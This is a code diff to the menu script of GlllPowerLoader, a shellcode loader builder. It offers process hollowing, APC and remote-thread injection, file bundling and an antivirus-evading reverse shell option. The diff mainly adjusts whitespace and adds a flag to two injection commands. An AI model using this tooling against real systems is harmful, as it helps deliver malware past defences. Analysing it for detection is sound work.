@@ -43,8 +43,6 @@ Injection Mode:
 """
 
 
-
-
 Option_stub = Resource.StringPainting.DynamicPainting.DynaminString()  + """
  bilibli:我不是格林
  Github:https://github.com/INotGreen/GlllPowerLoader
@@ -55,7 +53,6 @@ Option_stub = Resource.StringPainting.DynamicPainting.DynaminString()  + """
 \033[1;36m 4.文件托管(\033[1;33m File Bundle\033[0m)
 \033[1;36m 5.反弹Shell(\033[1;33mReverShell Bypass AntiVirus\033[0m)
 """
-
 
 
 with open('Stub/powershell_to_vbs.ps1', 'r',encoding='utf-8') as powershell_to_vbs:
@@ -137,7 +134,7 @@ def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
                       "\nPlease select shellcode loader:\n"
                       "+----------+----+--------------------------+--------+ \n"
                       "|                                                   | \n"
-                      "|1.C/C++ Staglesss ShellCode(bin)(单阶段加载)       |  \n"
+                      "|1.C/C++ Staglesss ShellCode(bin)(单阶段加载)        | \n"
                       "|                                                   | \n"
                       "+----------+----+--------------------------+--------+ \n")
                                 
@@ -191,7 +188,7 @@ def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
                                 """python Stub\\Cpp_loader.py "{0}" -m processhollow -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         elif Inject_Module in ["2", "QueueUserAPC", "queueUserapc"]:
                             os.system(
-                                """python Stub\\Cpp_loader.py "{0}"  -m queueUserapc -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
+                                """python Stub\\Cpp_loader.py "{0}"  -m queueUserapc -nr -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         elif Inject_Module in ["3", "RemoteThreadContext", "remotethreadcontext"]:
                             os.system(
                                 """python Stub\\Cpp_loader.py "{0}"  -m remotethreadcontext -p {1} -o "{2}"\n""".format(filepath, inject_option,outfile,str(outfile)))
@@ -200,7 +197,7 @@ def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
                                 """python Stub\\Cpp_loader.py "{0}" -p {1} -m remoteThreadsuspended -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         elif Inject_Module in ["5", "CurrentThread", "currentthread"]:
                             os.system(
-                                """python Stub\\Cpp_loader.py "{0}" -m currentthread -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
+                                """python Stub\\Cpp_loader.py "{0}" -m currentthread  -nr -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
                         
                         print("\n")
                         #os.system("del stub.cpp")
